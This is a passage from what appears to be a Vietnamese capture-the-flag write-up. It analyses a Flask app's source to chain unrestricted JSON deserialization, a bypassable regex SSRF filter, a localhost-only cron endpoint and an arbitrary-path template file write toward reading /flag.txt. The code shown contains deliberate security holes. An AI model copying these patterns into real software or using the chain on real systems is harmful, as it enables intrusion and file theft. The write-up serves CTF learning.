<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;task_type&#x27;</span>: <span class="string">&#x27;generate_report&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;report_id&#x27;</span>: report_id,</span><br><span class="line">    <span class="string">&#x27;report_token&#x27;</span>: report_token,</span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">    <span class="string">&#x27;config&#x27;</span>: data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Phân tích method <code>schedule_task</code> của class <code>Scheduler</code> ở file <code>scheduler.py</code>:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">schedule_task</span>(<span class="params">self, task_data</span>):</span><br><span class="line">        db = get_db()</span><br><span class="line">        task_id = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        db.execute(</span><br><span class="line">            <span class="string">&quot;INSERT INTO scheduled_tasks (id, task_type, task_data, status) VALUES (?, ?, ?, ?)&quot;</span>,</span><br><span class="line">            [task_id, task_data.get(<span class="string">&#x27;task_type&#x27;</span>), json.dumps(task_data), <span class="string">&#x27;pending&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        db.commit()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> task_id</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Phần dữ liệu json truyền vào được lưu vào cột <code>task_data</code> trong bảng <code>scheduled_tasks</code>.</p>
</li>
<li><p>Như vậy, chốt lại phần dữ liệu json ban đầu mà ta gửi đến api <code>/api/analytics/reports</code> sẽ được lưu vào database dưới dạng json.</p>
</li>
<li><p>Kế tiếp ta phân tích api <code>/api/webhooks/forward</code>:</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/webhooks/forward&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_webhook</span>():</span><br><span class="line">    <span class="keyword">from</span> services.webhook_service <span class="keyword">import</span> WebhookForwarder</span><br><span class="line">    </span><br><span class="line">    data = request.json</span><br><span class="line">    forwarder_obj = object_manager.deserialize(data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(forwarder_obj, WebhookForwarder):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid forwarder configuration&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    payload = data.get(<span class="string">&#x27;payload&#x27;</span>, &#123;&#125;)</span><br><span class="line">    result = forwarder_obj.forward(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(result)</span><br></pre></td></tr></table></figure>

<ul>
<li>Dữ liệu json do người dùng gửi đến cũng được deserialize tùy ý và có thêm bước kiểm tra: <code>if not isinstance(forwarder_obj, WebhookForwarder):</code>, đối tượng được tạo ra có phải là 1 <code>instance</code> của class <code>WebhookForwarder</code> hay không, nếu không phải sẽ trả về mã lỗi 400, còn nếu phải thì <code>forwarder_obj</code> (đối tượng được tạo thành của class <code>WebhookForwarder</code>) sẽ gọi đến method <code>forward</code>.</li>
<li>Phân tích method <code>forward</code> của class <code>WebhookForwarder</code> tại file <code>webhook_service.py</code>:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebhookForwarder</span>:</span><br><span class="line">    schema_version = <span class="string">&quot;1.0&quot;</span></span><br><span class="line">    serializable = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_url, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, **kwargs</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target_url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.method = method.upper()</span><br><span class="line">        <span class="variable language_">self</span>.headers = headers <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.options = kwargs</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(<span class="variable language_">self</span>.target_url):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;URL not allowed: localhost or private IP detected&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">                response = requests.get(</span><br><span class="line">                    <span class="variable language_">self</span>.target_url,</span><br><span class="line">                    headers=<span class="variable language_">self</span>.headers,</span><br><span class="line">                    timeout=<span class="number">5</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                response = requests.post(</span><br><span class="line">                    <span class="variable language_">self</span>.target_url,</span><br><span class="line">                    json=data,</span><br><span class="line">                    headers=<span class="variable language_">self</span>.headers,</span><br><span class="line">                    timeout=<span class="number">5</span></span><br><span class="line">                )</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;status_code&#x27;</span>: response.status_code,</span><br><span class="line">                <span class="string">&#x27;body&#x27;</span>: response.text[:<span class="number">1000</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_dict</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;target_url&#x27;</span>: <span class="variable language_">self</span>.target_url,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span>: <span class="variable language_">self</span>.method</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Kiểm tra thuộc tính <code>target_url</code> có phải là một url an toàn thông qua hàm <code>is_safe_url</code>:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_url</span>(<span class="params">url</span>)</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    host = parsed.hostname</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> host:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    localhost_patterns = [</span><br><span class="line">        <span class="string">r&#x27;^localhost$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^127\.&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^0\.0\.0\.0$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^::1$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^::$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^0:0:0:0:0:0:0:1$&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> localhost_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(pattern, host, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    private_ranges = [</span><br><span class="line">        <span class="string">r&#x27;^10\.&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^172\.(1[6-9]|2[0-9]|3[01])\.&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^192\.168\.&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^169\.254\.&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^fc00:&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^fe80:&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> private_ranges:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(pattern, host, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Hàm này sẽ chặn nếu host chứa các mẫu liên quan đến dãy ip local hoặc private.</p>
</li>
<li><p>Tuy nhiên, cách validate này chưa triệt để kẻ tấn công hoàn toàn có thể dùng một số phương pháp để bypass lớp validate không an toàn này.</p>
</li>
<li><p>Xem cách bypass tại đây: <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md</a></p>
</li>
<li><p>Sau khi vượt qua được lớp validate này thì method <code>forward</code> sẽ tiếp tục kiểm tra thuộc tính <code>method</code> là <code>GET</code> hoặc <code>POST</code> rồi request đến <code>url_target</code>, sau đó nhận phản hồi và trả lại phản hồi đó về phía người dùng.</p>
</li>
<li><p>Tận dụng api này, ta có thể truy cập đến một api nội bộ quan trọng là <code>/internal/cron/process</code>.</p>
</li>
<li><p>Bây giờ ta sẽ phân tích api nội bộ này <code>/internal/cron/process</code>:</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/internal/cron/process&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_scheduled_tasks</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Internal only&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        scheduler.process_pending()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">403</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;processed&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>Hàm <code>process_scheduled_tasks</code> sẽ check xem yêu cầu truy cập có thật sự đến từ local hay không nếu phải thì đối tượng <code>scheduler</code> sẽ gọi đến phương thức <code>process_pending</code>.</li>
<li>Ta sẽ tiếp tục phân tích method <code>process_pending</code> tại file <code>scheduler.py</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_pending</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">from</span> services.renderer <span class="keyword">import</span> TemplateRenderer</span><br><span class="line">        <span class="keyword">from</span> services.object_manager <span class="keyword">import</span> ObjectManager</span><br><span class="line">        </span><br><span class="line">        db = get_db()</span><br><span class="line">        pending = db.execute(</span><br><span class="line">            <span class="string">&quot;SELECT * FROM scheduled_tasks WHERE status = &#x27;pending&#x27; ORDER BY scheduled_at ASC LIMIT 10&quot;</span></span><br><span class="line">        ).fetchall()</span><br><span class="line">        </span><br><span class="line">        renderer = TemplateRenderer()</span><br><span class="line">        manager = ObjectManager()</span><br><span class="line">        cache_service = CacheService()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> task <span class="keyword">in</span> pending:</span><br><span class="line">            task_data = json.loads(task[<span class="string">&#x27;task_data&#x27;</span>])</span><br><span class="line">            task_type = task_data.get(<span class="string">&#x27;task_type&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> task_type == <span class="string">&#x27;generate_report&#x27;</span>:</span><br><span class="line">                    config_data = task_data.get(<span class="string">&#x27;config&#x27;</span>, &#123;&#125;)</span><br><span class="line">                    config_obj = manager.deserialize(config_data)</span><br><span class="line">                    report_token = task_data.get(<span class="string">&#x27;report_token&#x27;</span>, secrets.token_urlsafe(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(config_obj, ReportConfiguration):</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">hasattr</span>(config_obj, <span class="string">&#x27;processor&#x27;</span>) <span class="keyword">and</span> config_obj.processor:</span><br><span class="line">                            processor = config_obj.processor</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">hasattr</span>(processor, <span class="string">&#x27;output_config&#x27;</span>) <span class="keyword">and</span> processor.output_config:</span><br><span class="line">                                output_cfg = processor.output_config</span><br><span class="line">                                </span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">isinstance</span>(output_cfg, CacheConfiguration):</span><br><span class="line">                                    cache_service.prime(output_cfg)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(config_obj, <span class="string">&#x27;template&#x27;</span>) <span class="keyword">and</span> config_obj.template:</span><br><span class="line">                        template_spec = config_obj.template</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(template_spec, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;_type&#x27;</span> <span class="keyword">in</span> template_spec:</span><br><span class="line">                            template_spec = manager.deserialize(template_spec)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;template_name&#x27;</span>):</span><br><span class="line">                            output = renderer.render(template_spec)</span><br><span class="line">                            </span><br><span class="line">                            output_path = <span class="string">f&#x27;/var/tmp/sessionmaze/reports/<span class="subst">&#123;report_token&#125;</span>.html&#x27;</span></span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;output_path&#x27;</span>) <span class="keyword">and</span> template_spec.output_path:</span><br><span class="line">                                custom_output = template_spec.output_path</span><br><span class="line">                                <span class="keyword">if</span> <span class="keyword">not</span> custom_output.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">                                    output_path = os.path.join(<span class="string">&#x27;/var/tmp/sessionmaze/reports&#x27;</span>, custom_output)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    output_path = custom_output</span><br><span class="line">                            </span><br><span class="line">                            os.makedirs(os.path.dirname(output_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                f.write(output)</span><br><span class="line">                </span><br><span class="line">                db.execute(</span><br><span class="line">                    <span class="string">&quot;UPDATE scheduled_tasks SET status = ?, processed_at = ? WHERE id = ?&quot;</span>,</span><br><span class="line">                    [<span class="string">&#x27;completed&#x27;</span>, datetime.now().isoformat(), task[<span class="string">&#x27;id&#x27;</span>]]</span><br><span class="line">                )</span><br><span class="line">                db.commit()</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                db.execute(</span><br><span class="line">                    <span class="string">&quot;UPDATE scheduled_tasks SET status = ? WHERE id = ?&quot;</span>,</span><br><span class="line">                    [<span class="string">f&#x27;failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, task[<span class="string">&#x27;id&#x27;</span>]]</span><br><span class="line">                )</span><br><span class="line">                db.commit()</span><br></pre></td></tr></table></figure>

<ul>
<li>Truy xuất dữ liệu từ bảng <code>scheduled_tasks</code> với <code>status = &#39;pending&#39;</code> và lưu dữ liệu vào biến <code>pending</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pending = db.execute(</span><br><span class="line">    <span class="string">&quot;SELECT * FROM scheduled_tasks WHERE status = &#x27;pending&#x27; ORDER BY scheduled_at ASC LIMIT 10&quot;</span></span><br><span class="line">).fetchall()</span><br></pre></td></tr></table></figure>

<ul>
<li>Duyệt qua từng dòng trong <code>pending</code> rồi lấy dữ liệu json từ cột <code>task_data</code> rồi lưu vào biến <code>task_data</code>, từ biến <code>task_data</code> truy xuất trường <code>task_type</code> và lưu dữ liệu của trường này vào <code>task_type</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> pending:</span><br><span class="line">    task_data = json.loads(task[<span class="string">&#x27;task_data&#x27;</span>])</span><br><span class="line">    task_type = task_data.get(<span class="string">&#x27;task_type&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>Ở đoạn code tiếp theo chính là nơi deserialize data (từ api <code>/api/analytics/reports</code>) được lấy ra từ trường <code>config</code> của <code>task_data</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> task_type == <span class="string">&#x27;generate_report&#x27;</span>:</span><br><span class="line">                    config_data = task_data.get(<span class="string">&#x27;config&#x27;</span>, &#123;&#125;)</span><br><span class="line">                    config_obj = manager.deserialize(config_data)</span><br><span class="line">                    report_token = task_data.get(<span class="string">&#x27;report_token&#x27;</span>, secrets.token_urlsafe(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(config_obj, ReportConfiguration):</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">hasattr</span>(config_obj, <span class="string">&#x27;processor&#x27;</span>) <span class="keyword">and</span> config_obj.processor:</span><br><span class="line">                            processor = config_obj.processor</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">hasattr</span>(processor, <span class="string">&#x27;output_config&#x27;</span>) <span class="keyword">and</span> processor.output_config:</span><br><span class="line">                                output_cfg = processor.output_config</span><br><span class="line">                                </span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">isinstance</span>(output_cfg, CacheConfiguration):</span><br><span class="line">                                    cache_service.prime(output_cfg)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(config_obj, <span class="string">&#x27;template&#x27;</span>) <span class="keyword">and</span> config_obj.template:</span><br><span class="line">                        template_spec = config_obj.template</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(template_spec, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;_type&#x27;</span> <span class="keyword">in</span> template_spec:</span><br><span class="line">                            template_spec = manager.deserialize(template_spec)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;template_name&#x27;</span>):</span><br><span class="line">                            output = renderer.render(template_spec)</span><br><span class="line">                            </span><br><span class="line">                            output_path = <span class="string">f&#x27;/var/tmp/sessionmaze/reports/<span class="subst">&#123;report_token&#125;</span>.html&#x27;</span></span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;output_path&#x27;</span>) <span class="keyword">and</span> template_spec.output_path:</span><br><span class="line">                                custom_output = template_spec.output_path</span><br><span class="line">                                <span class="keyword">if</span> <span class="keyword">not</span> custom_output.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">                                    output_path = os.path.join(<span class="string">&#x27;/var/tmp/sessionmaze/reports&#x27;</span>, custom_output)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    output_path = custom_output</span><br><span class="line">                            </span><br><span class="line">                            os.makedirs(os.path.dirname(output_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                f.write(output)</span><br><span class="line">                </span><br><span class="line">                db.execute(</span><br><span class="line">                    <span class="string">&quot;UPDATE scheduled_tasks SET status = ?, processed_at = ? WHERE id = ?&quot;</span>,</span><br><span class="line">                    [<span class="string">&#x27;completed&#x27;</span>, datetime.now().isoformat(), task[<span class="string">&#x27;id&#x27;</span>]]</span><br><span class="line">                )</span><br><span class="line">                db.commit()</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Mình sẽ không phân tích thêm quá chi tiết cách để deserialize tại đoạn code trên vì sẽ khá dài và rối nhưng mà sẽ đưa ra hướng đi tạo được payload hợp lý nhằm đọc được <code>/flag.txt</code>.</p>
</li>
<li><p>Ta cần hiểu các thuộc tính và tính năng của class <code>ReportConfiguration</code>, <code>TemplateSpecification</code>.</p>
</li>
<li><p>Và ở class <code>TemplateSpecification</code>, ta có thể tận dụng để đọc file bất kỳ trên hệ thống.</p>
</li>
<li><p>Phân tích class <code>TemplateSpecification</code> nhằm hiểu được cơ chế đọc file.</p>
</li>
<li><p>Tại đoạn code dưới đây của file <code>scheduler.py</code>, có 1 dòng xử lý việc đọc file và lưu vào <code>/var/tmp/sessionmaze/reports/&#123;report_token&#125;.html</code> là <code>output = renderer.render(template_spec)</code>.</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">hasattr</span>(config_obj, <span class="string">&#x27;template&#x27;</span>) <span class="keyword">and</span> config_obj.template:</span><br><span class="line">    template_spec = config_obj.template</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(template_spec, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;_type&#x27;</span> <span class="keyword">in</span> template_spec:</span><br><span class="line">        template_spec = manager.deserialize(template_spec)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;template_name&#x27;</span>):</span><br><span class="line">        output = renderer.render(template_spec)</span><br><span class="line">        </span><br><span class="line">        output_path = <span class="string">f&#x27;/var/tmp/sessionmaze/reports/<span class="subst">&#123;report_token&#125;</span>.html&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;output_path&#x27;</span>) <span class="keyword">and</span> template_spec.output_path:</span><br><span class="line">            custom_output = template_spec.output_path</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> custom_output.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">                output_path = os.path.join(<span class="string">&#x27;/var/tmp/sessionmaze/reports&#x27;</span>, custom_output)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output_path = custom_output</span><br><span class="line">        </span><br><span class="line">        os.makedirs(os.path.dirname(output_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(output)</span><br></pre></td></tr></table></figure>

<ul>
